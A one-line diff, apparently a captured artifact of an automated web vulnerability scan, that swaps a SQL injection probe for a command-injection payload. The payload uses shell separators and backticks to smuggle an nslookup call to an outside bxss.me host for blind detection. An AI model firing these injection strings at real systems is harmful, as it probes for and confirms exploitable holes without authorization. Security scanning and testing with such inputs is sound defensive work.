@@ -1,1 +1,1 @@
--1' OR 2+394-394-1=0+0+0+1 -- 
+&nslookup -q=cname hitbfvzokqeacf9633.bxss.me&'\"`0&nslookup -q=cname hitbfvzokqeacf9633.bxss.me&`'
